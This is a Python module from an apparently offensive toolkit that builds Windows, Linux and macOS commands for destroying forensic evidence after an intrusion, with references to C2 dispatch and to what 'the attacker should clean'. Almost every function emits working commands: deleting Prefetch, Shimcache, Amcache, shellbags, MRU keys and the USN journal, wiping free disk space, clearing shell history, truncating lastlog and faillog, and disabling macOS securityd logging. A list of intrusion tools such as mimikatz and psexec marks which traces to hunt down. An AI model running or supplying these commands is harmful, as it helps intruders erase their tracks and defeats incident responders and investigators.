"""Forensic artifact cleaner — Prefetch, Shimcache, Amcache, MFT/USN cleanup.

Removes evidence of execution from Windows forensic artifacts: Prefetch
files (.pf), Shimcache (AppCompatCache), Amcache registry entries,
MFT records, USN journal entries, Jump Lists, LNK files, and Recent
documents. Covers both automated cleanup and manual operator-guided
forensic wiping.

Linux/macOS equivalents cover bash history, syslog entries, atime
modification, and unified log pruning.
"""

from __future__ import annotations

from dataclasses import dataclass
from pathlib import Path
from typing import Any

SESSIONS_DIR = Path(__file__).resolve().parent.parent / "sessions"


@dataclass
class ForensicCleanerConfig:
    """Configuration for forensic artifact cleaning.

    Attributes:
        target_platform: windows, linux, or macos.
        clean_prefetch: Remove Windows Prefetch files (.pf).
        clean_shimcache: Clear Windows Shimcache (AppCompatCache).
        clean_amcache: Clear Windows Amcache registry entries.
        clean_usn_journal: Purge Windows USN journal.
        clean_jump_lists: Remove Windows Jump Lists.
        clean_recent_files: Clear Recent files and MRU lists.
        clean_shellbags: Clear Windows Shellbags (explorer paths).
        clean_lnk_files: Remove LNK shortcut files in Recent dirs.
        clean_mru: Clear Most Recently Used (MRU) registry entries.
        clean_thumbnail_cache: Remove thumbnail cache files.
        clean_mft_records: Overwrite deleted MFT records (requires defrag + sdelete).
        verify: Run verification checks after cleaning.
    """

    target_platform: str = "windows"
    clean_prefetch: bool = True
    clean_shimcache: bool = True
    clean_amcache: bool = True
    clean_usn_journal: bool = False
    clean_jump_lists: bool = True
    clean_recent_files: bool = True
    clean_shellbags: bool = True
    clean_lnk_files: bool = True
    clean_mru: bool = True
    clean_thumbnail_cache: bool = True
    clean_mft_records: bool = False
    verify: bool = True


class ForensicCleaner:
    """Generate artifact removal commands for Windows, Linux, and macOS.

    Each method produces platform-native commands that can be executed
    directly on the target or wrapped in a C2 command dispatch.

    Attributes:
        config: ForensicCleanerConfig for target and artifact selection.
    """

    def __init__(self, config: ForensicCleanerConfig | None = None):
        self.config = config or ForensicCleanerConfig()

    def windows_cleanup(self) -> dict[str, Any]:
        """Generate Windows forensic artifact cleanup commands.

        Returns:
            Dict with PowerShell/batch commands organized by artifact type.
        """
        commands: dict[str, list[str]] = {}

        if self.config.clean_prefetch:
            commands["prefetch"] = [
                'Remove-Item -Path "C:\\Windows\\Prefetch\\*.pf" -Force -ErrorAction SilentlyContinue',
                'del /f /q C:\\Windows\\Prefetch\\*.pf 2>nul',
                'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters" /v EnablePrefetcher /t REG_DWORD /d 0 /f',
            ]

        if self.config.clean_shimcache:
            commands["shimcache"] = [
                'reg delete "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache" /f',
                'reg delete "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache\\AppCompatCache" /f',
            ]

        if self.config.clean_amcache:
            commands["amcache"] = [
                'reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Amcache" /f',
                'Remove-Item -Path "C:\\Windows\\AppCompat\\Programs\\Amcache.hve*" -Force -ErrorAction SilentlyContinue',
                'reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppModel\\StateChange\\Amcache" /f',
            ]

        if self.config.clean_jump_lists:
            commands["jump_lists"] = [
                'Remove-Item -Path "$env:APPDATA\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\*" -Force',
                'Remove-Item -Path "$env:APPDATA\\Microsoft\\Windows\\Recent\\CustomDestinations\\*" -Force',
            ]

        if self.config.clean_recent_files:
            commands["recent_files"] = [
                'Remove-Item -Path "$env:APPDATA\\Microsoft\\Windows\\Recent\\*" -Force',
                'Remove-Item -Path "$env:USERPROFILE\\Recent\\*" -Force',
            ]

        if self.config.clean_shellbags:
            commands["shellbags"] = [
                'reg delete "HKCU\\Software\\Microsoft\\Windows\\Shell\\BagMRU" /f',
                'reg delete "HKCU\\Software\\Microsoft\\Windows\\Shell\\Bags" /f',
                'reg delete "HKCU\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\BagMRU" /f',
                'reg delete "HKCU\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\Bags" /f',
            ]

        if self.config.clean_lnk_files:
            commands["lnk_files"] = [
                'Remove-Item -Path "$env:APPDATA\\Microsoft\\Office\\Recent\\*" -Force',
                'Remove-Item -Path "$env:APPDATA\\Microsoft\\Windows\\Recent\\*.lnk" -Force',
            ]

        if self.config.clean_mru:
            commands["mru"] = [
                'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU" /f',
                'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSavePidlMRU" /f',
                'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\LastVisitedPidlMRU" /f',
                'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPaths" /f',
            ]

        if self.config.clean_thumbnail_cache:
            commands["thumbcache"] = [
                'Remove-Item -Path "$env:LOCALAPPDATA\\Microsoft\\Windows\\Explorer\\thumbcache_*.db" -Force',
                'Remove-Item -Path "$env:LOCALAPPDATA\\Microsoft\\Windows\\Explorer\\iconcache_*.db" -Force',
            ]

        if self.config.clean_usn_journal:
            commands["usn_journal"] = [
                'fsutil usn deletejournal /d C:',
                'fsutil usn createjournal m=1000 a=1000 C:',
            ]

        if self.config.clean_mft_records:
            commands["mft_records"] = [
                'cipher /w:C:\\ 2>nul',
                'sdelete64.exe -z C:',
            ]

        verification = []
        if self.config.verify:
            verification = [
                "dir C:\\Windows\\Prefetch\\",
                'reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache"',
                'dir "$env:APPDATA\\Microsoft\\Windows\\Recent\\"',
                'reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"',
            ]

        return {
            "platform": "windows",
            "cleanup_commands": commands,
            "verification": verification,
        }

    def linux_cleanup(self) -> dict[str, Any]:
        """Generate Linux forensic artifact cleanup commands.

        Returns:
            Dict with bash commands for shell history, log cleanup,
            and filesystem timestamp manipulation.
        """
        return {
            "platform": "linux",
            "commands": [
                "# Shell history",
                "history -c; unset HISTFILE; rm -f ~/.bash_history ~/.zsh_history ~/.zhistory",
                "# Vim/less history",
                "rm -f ~/.viminfo ~/.lesshst",
                "# Command-not-found database",
                "rm -f /var/lib/command-not-found/commands.db*",
                "# locate database (contains file paths)",
                "updatedb -l 0 -o /dev/null 2>/dev/null",
                "# Session files",
                "rm -f ~/.ssh/known_hosts.bak",
                "# Temporary files from compromised session",
                "rm -rf /tmp/.X11-unix/* /tmp/.ICE-unix/* 2>/dev/null",
                "# Remove from lastlog/faillog",
                "> /var/log/lastlog 2>/dev/null",
                "> /var/log/faillog 2>/dev/null",
            ],
        }

    def macos_cleanup(self) -> dict[str, Any]:
        """Generate macOS forensic artifact cleanup commands.

        Returns:
            Dict with zsh commands for macOS-specific artifacts.
        """
        return {
            "platform": "macos",
            "commands": [
                "# Shell history",
                "> ~/.zsh_history 2>/dev/null",
                "> ~/.bash_history 2>/dev/null",
                "rm -rf ~/.zsh_sessions/*",
                "# Quick Look thumbnail cache",
                "rm -rf ~/Library/Caches/com.apple.QuickLookDaemon*/*",
                "# Recent items",
                "defaults delete com.apple.recentitems 2>/dev/null",
                "# Siri suggestions (contains app usage)",
                "rm -rf ~/Library/Caches/com.apple.siri.*/",
                "# Spotlight index (contains all file metadata)",
                "mdutil -E / 2>/dev/null",
                "# CoreServices quarantine database",
                "sqlite3 ~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2 'DELETE FROM LSQuarantineEvent'",
                "# Unified log (already covered by log_tamper, but spot-clean specific entries)",
                "log config --mode 'level:off' --subsystem com.apple.securityd 2>/dev/null",
            ],
        }

    def windows_prefetch_parse(self, prefetch_path: str = "C:\\Windows\\Prefetch") -> dict[str, Any]:
        """Parse Prefetch files to identify what the attacker should clean.

        Args:
            prefetch_path: Directory containing .pf files.

        Returns:
            Dict with Prefetch analysis commands.
        """
        return {
            "platform": "windows",
            "parse_commands": [
                f'Get-ChildItem -Path "{prefetch_path}" -Filter "*.pf" | ForEach-Object {{ $_.Name; [datetime]::FromFileTime($_.LastWriteTime.ToFileTime()) }}',
                "WinPrefetchView.exe /scomma prefetch_report.csv",
            ],
            "analysis": "Look for .pf files with names matching your tools. Each file == evidence of execution.",
            "target_tools": [
                "mimikatz", "psexec", "nc", "powershell", "cmd", "whoami",
                "net", "netstat", "ipconfig", "wmic", "schtasks", "reg",
                "bitsadmin", "certutil", "rundll32", "mshta", "cscript", "wscript",
            ],
        }

    def amcache_parse(self) -> dict[str, Any]:
        """Parse Amcache registry entries for evidence of execution.

        Returns:
            Dict with Amcache parsing commands.
        """
        return {
            "platform": "windows",
            "commands": [
                'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Amcache"',
                'Get-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Amcache"',
            ],
            "tool_based": [
                "AmcacheParser.exe -f C:\\Windows\\AppCompat\\Programs\\Amcache.hve --csv output/",
            ],
        }
